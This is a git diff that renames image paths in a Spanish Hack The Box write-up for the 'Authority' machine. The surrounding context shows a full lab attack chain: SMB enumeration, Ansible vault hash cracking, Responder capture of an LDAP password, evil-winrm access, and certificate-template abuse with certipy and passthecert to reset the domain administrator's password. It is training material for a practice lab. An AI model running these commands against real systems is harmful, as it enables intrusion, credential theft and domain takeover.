@@ -3,7 +3,7 @@ title: "Authority - WriteUp"
 date: Sun Feb 23 2025 20:00:00 GMT+0100 (Central European Standard Time)
 categories: [WriteUps, HTB, Windows]
 tags: [ctf, nmap, htb, winrm, powershell, responder, certify, evil-winrm, bash, smb]
-image: /assets/img/htb-writeups/Pasted image 20231127115847.png
+image: /assets/img/htb-writeups/Pasted-image-20231127115847.png
 ---
 
 {% include machine-info.html
@@ -13,7 +13,7 @@ image: /assets/img/htb-writeups/Pasted image 20231127115847.png
   platform="HTB"
 %}
 
-![Authority](/assets/img/htb-writeups/Pasted image 20231127115847.png)
+![Authority](/assets/img/htb-writeups/Pasted-image-20231127115847.png)
 
 ------
 Tags:             
@@ -164,9 +164,9 @@ HTTP
 https://10.129.22.56:8443/pwm/private/login
 ```
 
-![AUTHORITY](/assets/img/htb-writeups/Pasted image 20231127115847.png)
+![AUTHORITY](/assets/img/htb-writeups/Pasted-image-20231127115847.png)
 
-![AUTHORITY](/assets/img/htb-writeups/Pasted image 20231127115923.png)
+![AUTHORITY](/assets/img/htb-writeups/Pasted-image-20231127115923.png)
 
 Comenzaremos por enumerar los recursos compartidos:
 
@@ -174,7 +174,7 @@ Comenzaremos por enumerar los recursos compartidos:
 $ smbmap -H 10.129.229.56 -u 'user'
 ```
 
-![AUTHORITY](/assets/img/htb-writeups/Pasted image 20231127110705.png)
+![AUTHORITY](/assets/img/htb-writeups/Pasted-image-20231127110705.png)
 
 Vamos a investigar un poco más a fondo:
 
@@ -182,11 +182,11 @@ Vamos a investigar un poco más a fondo:
 $ smbclient //10.129.229.56/Development
 ```
 
-![AUTHORITY](/assets/img/htb-writeups/Pasted image 20231127111640.png)
+![AUTHORITY](/assets/img/htb-writeups/Pasted-image-20231127111640.png)
 
 Archivo encontrado (\\Automation\\Ansible\\ADCS\\defaults\\main-yml)  con posibles credenciales 
 
-![AUTHORITY](/assets/img/htb-writeups/Pasted image 20231127113544.png)
+![AUTHORITY](/assets/img/htb-writeups/Pasted-image-20231127113544.png)
 
 Resumen de datos encontrados:
 
@@ -208,13 +208,13 @@ robot:T0mc@tR00t        || Apache Tomcat
 
 Y un archivo con hashes en la ruta Automation/Ansible/PWM/defaults/main.yml
 
-![AUTHORITY](/assets/img/htb-writeups/Pasted image 20231127125352.png)
+![AUTHORITY](/assets/img/htb-writeups/Pasted-image-20231127125352.png)
 
 Copiamos cada uno de los hashes en archivos separados con extensión .yml
 
 Ejemplo:
 
-![AUTHORITY](/assets/img/htb-writeups/Pasted image 20231127133154.png)
+![AUTHORITY](/assets/img/htb-writeups/Pasted-image-20231127133154.png)
 
 Ahora con nuestro amigo _John_ obtendremos el hash apto para crackearlo.
 
@@ -222,7 +222,7 @@ Ahora con nuestro amigo _John_ obtendremos el hash apto para crackearlo.
 $ ansible2john main-pwm1.yml > hash1.txt
 ```
 
-![AUTHORITY](/assets/img/htb-writeups/Pasted image 20231127133349.png)
+![AUTHORITY](/assets/img/htb-writeups/Pasted-image-20231127133349.png)
 
 Ahora iremos pasando a _John_ uno a uno:
 
@@ -232,7 +232,7 @@ $ john --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt
 '!@#$%^&*'
 ```
 
-![AUTHORITY](/assets/img/htb-writeups/Pasted image 20231127133633.png)
+![AUTHORITY](/assets/img/htb-writeups/Pasted-image-20231127133633.png)
 
 Tenemos la key para desencriptar la vault de Ansible. Para los tres archivos es la misma.
 
@@ -261,7 +261,7 @@ Vamos a probarlas en la web que hemos encontrado antes:
 https://authority.htb.corp:8443/pwm/private/login
 ```
 
-![AUTHORITY](/assets/img/htb-writeups/Pasted image 20231127140708.png)
+![AUTHORITY](/assets/img/htb-writeups/Pasted-image-20231127140708.png)
 
 Nos da error pero encontramos un nuevo usuario llamado _svc_ldap_. Lo anotamos.
 
@@ -271,13 +271,13 @@ Vamos a comprobar los usuario que tenemos hasta ahora con _kerbrute_ ya qie el p
 $ kerbrute userenum --dc 10.129.229.56 -d authority.htb users.txt
 ```
 
-![AUTHORITY](/assets/img/htb-writeups/Pasted image 20231127141035.png)
+![AUTHORITY](/assets/img/htb-writeups/Pasted-image-20231127141035.png)
 
 Confirmado, es un usuario válido, pero no tiene seteado el UF_DONT_REQUIRE_PREAUTH.
 
 De nuevo en la web, si pulsamos sobre "Configuration Manager" nos pedirá una contraseña, probamos 'pWm_@dm!N_!23'.
 
-![AUTHORITY](/assets/img/htb-writeups/Pasted image 20231127142048.png)
+![AUTHORITY](/assets/img/htb-writeups/Pasted-image-20231127142048.png)
 
 Nos aparece la configuración del servidor LDAP, nos descargamos el archivo de configuración por si lo necesitamos examinar más adelante.
 
@@ -285,19 +285,19 @@ Pinchamos en la flecha de arriba a la derecha y pulsamos sobre "editor"
 
 Ahora en el campo de búsqueda escribimos "ldap" sin las comillas y nos encuentra la ruta del supuesto servidor LDAP. Pero como el servicio no está activo, da error. Vamos a modificar la ruta poniendo la IP de nuestro equipo, el puerto por defecto 389 y nos pondremos a la escucha con _responder_:
 
-![AUTHORITY](/assets/img/htb-writeups/Pasted image 20231127143444.png)
+![AUTHORITY](/assets/img/htb-writeups/Pasted-image-20231127143444.png)
 
 ```bash
 $ responder -I tun0 -wA
 ```
 
-![AUTHORITY](/assets/img/htb-writeups/Pasted image 20231127143648.png)
+![AUTHORITY](/assets/img/htb-writeups/Pasted-image-20231127143648.png)
 
 Pulsamos sobre el botón "Test LDAP Profile" y nos dará un arror como que no encuentra el servidor LDAP.
 
 Pero si vamos al _responder_...
 
-![AUTHORITY](/assets/img/htb-writeups/Pasted image 20231127143918.png)
+![AUTHORITY](/assets/img/htb-writeups/Pasted-image-20231127143918.png)
 
 Nos muestra la contraseña del usuario _svc_ldap_ en texto plano! Bien!
 
@@ -311,7 +311,7 @@ Vamos a probar las nuevas credenciales:
 $ crackmapexec smb 10.129.229.56 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' --shares
 ```
 
-![AUTHORITY](/assets/img/htb-writeups/Pasted image 20231127144356.png)
+![AUTHORITY](/assets/img/htb-writeups/Pasted-image-20231127144356.png)
 
 Tenemos nuevos recursos compartidos, esto pinta bien. 
 
@@ -321,7 +321,7 @@ Vamos a probar si tenemos acceso a través de WinRM:
 $ crackmapexec winrm 10.129.229.56 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
 ```
 
-![AUTHORITY](/assets/img/htb-writeups/Pasted image 20231127144526.png)
+![AUTHORITY](/assets/img/htb-writeups/Pasted-image-20231127144526.png)
 
 Y obtenemos un Pwn3d!
 
@@ -331,7 +331,7 @@ Vamos a conectar a la máquina con _Evil-WinRM_.
 $ evil-winrm -i 10.129.229.56 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
 ```
 
-![AUTHORITY](/assets/img/htb-writeups/Pasted image 20231127144817.png)
+![AUTHORITY](/assets/img/htb-writeups/Pasted-image-20231127144817.png)
 
 Estamos dentro!
 
@@ -354,7 +354,7 @@ Nos fijamos en un privilegio que nos llama la atención, podemos agregar máquin
 
 Seguimos revisando y en C:\\ encontramos una carpeta  llamada "Certs"
 
-![AUTHORITY](/assets/img/htb-writeups/Pasted image 20231127163206.png)
+![AUTHORITY](/assets/img/htb-writeups/Pasted-image-20231127163206.png)
 
 Encontramos un certificado de navegador exportable de LDAP.
 
@@ -364,9 +364,9 @@ Vamos a usar el binario _Certify.exe_ para ver si tiene vulnerabilidades asociad
 > .\Certify.exe find /vulnerable
 ```
 
-![AUTHORITY](/assets/img/htb-writeups/Pasted image 20231127165947.png)
+![AUTHORITY](/assets/img/htb-writeups/Pasted-image-20231127165947.png)
 
-![AUTHORITY](/assets/img/htb-writeups/Pasted image 20231127170050.png)
+![AUTHORITY](/assets/img/htb-writeups/Pasted-image-20231127170050.png)
 
 Como podemos ver, hay una plantilla de certificado vulnerable que podemos usar para escalar nuestros privilegios.
 
@@ -378,7 +378,7 @@ Más info: https://book.hacktricks.xyz/windows-hardening/active-directory-method
 $ impacket-addcomputer authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' -dc-ip 10.129.229.56 -computer-name 'powerpc' -computer-pass 'password123'
 ```
 
-![AUTHORITY](/assets/img/htb-writeups/Pasted image 20231127171749.png)
+![AUTHORITY](/assets/img/htb-writeups/Pasted-image-20231127171749.png)
 
 Ahora que hemos podido agregar una máquina ficticia, vamos a obtener su certificado con _certipy-ad_ o _certipy_. Es lo mismo pero distintas versiones según el SO que uses.
 
@@ -386,11 +386,11 @@ Ahora que hemos podido agregar una máquina ficticia, vamos a obtener su certifi
 $ certipy find -u 'powerpc$' -p 'password123' -dc-ip 10.129.229.56
 ```
 
-![AUTHORITY](/assets/img/htb-writeups/Pasted image 20231127173317.png)
+![AUTHORITY](/assets/img/htb-writeups/Pasted-image-20231127173317.png)
 
 Revisando el archivo JSON descargado vemos que tenemos un certificado para suplantar un usuario con privilegios.
 
-![AUTHORITY](/assets/img/htb-writeups/Pasted image 20231127173736.png)
+![AUTHORITY](/assets/img/htb-writeups/Pasted-image-20231127173736.png)
 
 Con estos datos vamos a reclamar nuestro certificado de usuario Administrador:
 
@@ -398,7 +398,7 @@ Con estos datos vamos a reclamar nuestro certificado de usuario Administrador:
 $ certipy req -username 'powerpc$' -password 'password123' -ca 'AUTHORITY-CA' -target 10.129.229.56 -template 'CorpVpn' -upn "administrator@authority.htb"
 ```
 
-![AUTHORITY](/assets/img/htb-writeups/Pasted image 20231127182704.png)
+![AUTHORITY](/assets/img/htb-writeups/Pasted-image-20231127182704.png)
 
 Ahora vamos a generar los certificados para usarlos con la herramienta _passthecert.py_ que usaremos para para validarnos y cambiar la contraseña de administrador.
 https://github.com/AlmondOffSec/PassTheCert/tree/main/Python
@@ -409,7 +409,7 @@ Nos la descargamos y ejecutamos lo siguiente:
 $ python3 passthecert.py -crt user.crt -key user.key -dc-ip 10.129.229.56 -domain authority.htb -action modify_user -target administrator -new-pass P0wnedll!
 ```
 
-![AUTHORITY](/assets/img/htb-writeups/Pasted image 20231127184318.png)
+![AUTHORITY](/assets/img/htb-writeups/Pasted-image-20231127184318.png)
 
 Si todo ha ido bien podremos conectar mediante WinRM con las nuevas credenciales.
 
@@ -417,7 +417,7 @@ Si todo ha ido bien podremos conectar mediante WinRM con las nuevas credenciales
 evil-winrm -i 10.129.229.56 -u 'administrator' -p 'P0wnedll!'
 ```
 
-![AUTHORITY](/assets/img/htb-writeups/Pasted image 20231127184557.png)
+![AUTHORITY](/assets/img/htb-writeups/Pasted-image-20231127184557.png)
 
 P0wned!!!
 
